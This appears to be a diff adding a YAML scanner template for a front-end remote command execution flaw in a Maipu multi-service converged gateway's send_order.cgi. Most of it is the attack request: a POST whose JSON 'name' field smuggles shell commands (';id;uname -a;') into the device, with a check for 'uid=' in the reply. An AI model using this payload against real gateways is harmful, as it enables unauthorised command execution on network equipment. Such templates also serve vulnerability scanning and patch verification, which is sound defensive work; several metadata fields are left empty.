@@ -1,0 +1,22 @@
+id:
+
+info:
+  name: 迈普多业务融合网关send_order.cgi 前台RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /send_order.cgi?parameter=operation
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64MHhzZWM=; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    Content-Type: application/x-www-form-urlencoded
+    Connection: keep-alive
+  data: |
+    {"opid":"1","name":";id;uname -a;","type":"rest"}
+response1:
+  body: uid=
+  code: 200
+requests2:
+response2:
